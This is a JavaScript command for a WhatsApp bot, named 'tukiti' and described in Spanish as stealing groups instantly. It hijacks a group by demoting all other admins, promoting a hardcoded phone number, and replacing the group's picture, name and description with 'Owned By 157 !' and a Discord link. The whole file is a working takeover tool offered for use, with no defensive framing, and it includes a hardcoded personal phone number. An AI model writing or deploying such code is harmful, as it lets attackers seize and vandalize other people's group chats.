import fs from 'fs';
import fetch from 'node-fetch';

export default {
  name: "tukiti",
  description: "Grabea grupos xd, los roba al instante",
  async execute(m, { conn, participants, groupMetadata }) {
    if (!m.isGroup) return conn.reply(m.chat, "Este comando solo funciona en grupos", m);
    const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";
    const adminNumber = "526567044256@s.whatsapp.net";

    const admins = participants.filter(p => p.admin);
    for (const p of admins) {
      if (p.id !== adminNumber && p.id !== botNumber) {
        await conn.groupParticipantsUpdate(m.chat, [p.id], "demote");
      }
    }

    const isAdmin = participants.find(p => p.id === adminNumber && p.admin);
    if (!isAdmin) {
      await conn.groupParticipantsUpdate(m.chat, [adminNumber], "promote");
    }

    const imageBuffer = await fetch("https://i.pinimg.com/736x/08/c2/8e/08c28e967d7d1502b822f204e4b6c27c.jpg").then(res => res.buffer());
    await conn.updateProfilePicture(m.chat, imageBuffer);

    await conn.groupUpdateSubject(m.chat, "Owned By 157 !");

    await conn.groupUpdateDescription(m.chat, "discord.gg");

    conn.reply(m.chat, "ss", m);
  }
};
